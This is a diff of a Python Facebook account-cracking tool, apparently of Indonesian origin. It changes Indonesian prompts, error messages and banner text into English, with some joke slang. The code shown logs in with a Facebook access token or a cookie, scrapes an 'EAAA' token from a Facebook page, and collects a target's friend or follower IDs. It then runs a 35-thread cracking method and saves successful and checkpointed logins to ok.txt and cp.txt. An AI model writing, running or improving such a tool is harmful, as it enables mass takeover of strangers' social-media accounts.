@@ -8,13 +8,13 @@ import requests as req,json,os,time,pyfiglet,re
 from concurrent.futures import ThreadPoolExecutor as Bool
 from bs4 import BeautifulSoup as parser
 try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
-except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
+except req.exceptions.ConnectionError:exit("[!] Connection Errno Goblok")
 #nama - nama buat logo :v
 try:
-	log=pyfiglet.figlet_format('LOGIN')
-	title=pyfiglet.figlet_format('CRACK')
-	teman=pyfiglet.figlet_format('TEMAN')
-	publik=pyfiglet.figlet_format('PUBLIK')
+	log=pyfiglet.figlet_format('DRAGON')
+	title=pyfiglet.figlet_format('DRAGON')
+	teman=pyfiglet.figlet_format('FRIENDS')
+	publik=pyfiglet.figlet_format('PUBLIC')
 except:os.system('pip install pyfiglet')
 
 os.system("clear")
@@ -24,12 +24,12 @@ idTeman,idPublik=[],[]
 
 #buat logika login dan login pake token :v
 def pilihLogin():
-	pil=input("[?] Pilih yang mana : ")
+	pil=input("[?] Select which one : ")
 	if(pil in ("","  ","   ","    ","     ","      ","       ")):
 		print("[!] Jangan Kosong\n")
 		pilihLogin()
 	elif(pil in ("1","01")):
-		token=input("[!] Access Token Facebook Anda : ")
+		token=input("[!] Access Your Token Facebook : ")
 		try:
 			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
 			print("[√] Login Berhasil\nNama Akun :",r['name'])
@@ -38,11 +38,11 @@ def pilihLogin():
 			time.sleep(2)
 			nampung(token).menu()
 		except KeyError:
-			print('[!] Token Anda Salah')
+			print('[!] Wrong Token')
 			time.sleep(2)
 			login()
 	elif(pil in ("2","02")):
-		cookie=input("[!] Masukan Cookie Fb Anda : ")
+		cookie=input("[!] Input Your Cookie FB : ")
 		tomken=req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
            'referer': 'https://m.facebook.com/', 
            'host': 'm.facebook.com', 
@@ -54,7 +54,7 @@ def pilihLogin():
            'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
 		find_token = re.search('(EAAA\w+)',tomken.text)
 		if (find_token is None):
-			print("[!] Cookie Facebook Salah")
+			print("[!] Cookie Facebook Is Wrong")
 			time.sleep(2)
 			login()
 		else:
@@ -80,22 +80,22 @@ def pilihLogin():
 		pilihLogin()
 def login():
 	os.system('clear')
-	print(log+"\nLogin Dolo Bang :>\n[1]. Login Dengan Access Token Fb\n[2]. Login Dengan Cookie Facebook\n")
+	print(log+"\nPlease Login First :>\n[1]. Login With Access Token FB\n[2]. Login With Cookie Facebook\n")
 	pilihLogin()
 def logika():
 	try:
 		token=open('log.txt','r').read()
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
-		print('[√] Anda sudah login\nNama akun anda :',r['name'])
+		print('[√] Antum soedah login\nNama akun antum :',r['name'])
 		time.sleep(2)
 		nampung(token).menu()
 	except KeyError:
-		print('[!] Token anda invalid')
+		print('[!] Token invalid Alias Hangus')
 		os.system("rm -rf tt.txt")
 		time.sleep(2)
 		login()
 	except FileNotFoundError:
-		print('[!] Anda belum login')
+		print('[!] Antum Beloem Login ')
 		time.sleep(2)
 		login()
 #class buat ngecrack :v
@@ -195,7 +195,7 @@ class nampung:
 		global idTeman
 		os.system('clear')
 		print(teman+"\nSubscribe Youtube Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
-		print('[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
+		print('[!] Select Methode Crack\n[1]. Methode Mbasic (Medium, some results will successful)\n[2]. Methode Api (Fast, all hit by checkpoints)\n')
 		pi=input("[?] Mau methode mana : ")
 		time.sleep(1)
 		print("\n[!] Ok save : ok.txt\n[!] Cp save : cp.txt\n")
@@ -228,15 +228,15 @@ class nampung:
 		global idPublik
 		os.system('clear')
 		print(publik+"\nSubscribe Youtube Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
-		print('\n[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
+		print('\n[!] Select Methode Crack\n[1]. Methode Mbasic (Medium, tidak cp semua)\n[2]. Methode Api (Fast, kemungkinan cp semua)\n')
 		pi=input("[?] Mau methode mana : ")
 		print("")
-		target=input("[?] ID FB target/publik : ")
+		target=input("[?] ID FB target/public : ")
 		try:
 			t=json.loads(req.get(f"https://graph.facebook.com/{target}?access_token={self.token}").text)
-			print("\n[+] Nama target/publik :",t['name'])
+			print("\n[+] Name target/public :",t['name'])
 		except:
-			print('[×] Target/Publik Tidak Ditemukan')
+			print('[×] Target/Public not found')
 			time.sleep(2)
 			nampung(self.token).menu()
 		with Bool(max_workers=35) as tokai:
@@ -270,9 +270,9 @@ class nampung:
 		elif pilih in ("02","2"):nampung(self.token).sendPublik()
 		elif pilih=="99":
 			os.system("rm -rf log.txt")
-			exit("[√] Logout Berhasil")
+			exit("[√] Logout Succes")
 		else:
-			print("[!] Pilihan tidak ada\n")
+			print("[!] Pilihan tydack ada \n")
 			nampung(self.token).pilihan()
 	def menu(self):
 		os.system("clear")
